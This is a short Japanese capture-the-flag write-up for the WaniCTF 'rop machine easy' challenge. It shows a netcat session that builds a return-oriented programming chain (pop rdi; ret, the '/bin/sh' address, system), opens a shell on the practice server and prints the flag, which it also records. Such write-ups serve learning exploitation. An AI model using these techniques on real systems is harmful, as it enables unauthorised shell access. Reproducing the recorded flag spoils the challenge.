# rop machine easy (189pt Easy)

# 問題文

`nc rop-easy.pwn.wanictf.org 9003`

## ヒント
- ropでsystem("/bin/sh")を実行して下さい。
- "/bin/sh"のアドレスは提供されています
- rop machineの使い方->wani-hackase/rop-machine

## 使用ツール例
- netcat (nc)

## gccのセキュリティ保護
- Partial RELocation ReadOnly (RELRO)
- Stack Smash Protection (SSP)有効
- No eXecute bit(NX)有効
- Position Independent Executable (PIE)無効

# やったこと

```
$ nc rop-easy.pwn.wanictf.org 9003

"/bin/sh" address is 0x404070

[menu]
1. append hex value
2. append "pop rdi; ret" addr
3. append "system" addr
8. show menu (this one)
9. show rop_arena
0. execute rop
> 
```

スタックに命令を追加して最後に実行すれば良いっぽいです．

https://www.mztn.org/lxasm64/x86_x64_table.html
等のページを見ると，
第一引数はrdiレジスタ入れると良いっぽいです．

```
$ nc rop-easy.pwn.wanictf.org 9003

"/bin/sh" address is 0x404070

...

> 0
     rop_arena
+--------------------+
| pop rdi; ret       |<- rop start
+--------------------+
| 0x0000000000404070 |
+--------------------+
| system             |
+--------------------+
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{this-is-simple-return-oriented-programming}
```

pop rdiでスタック上の0x404070をrdiレジスタに移動させます．
これで第一引数に0x404070("/bin/sh")を指定した状態でsystemを実行できます．

実行するとsystem("/bin/sh")が実行されてshellが起動しました．
flag.txtを見るとフラグがありました．

# フラグ
FLAG{this-is-simple-return-oriented-programming}

# メモ
pwnは超初心者なので間違ってるところがあるかも．
